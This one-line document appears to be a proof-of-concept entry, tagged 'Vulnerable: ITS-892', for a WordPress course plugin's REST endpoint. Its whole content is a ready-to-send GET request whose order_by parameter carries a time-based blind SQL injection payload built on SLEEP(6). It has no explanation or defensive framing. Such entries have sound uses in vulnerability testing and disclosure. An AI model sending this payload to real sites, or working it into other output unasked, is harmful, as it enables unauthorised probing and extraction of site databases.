# Vulnerable: ITS-892
GET /wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
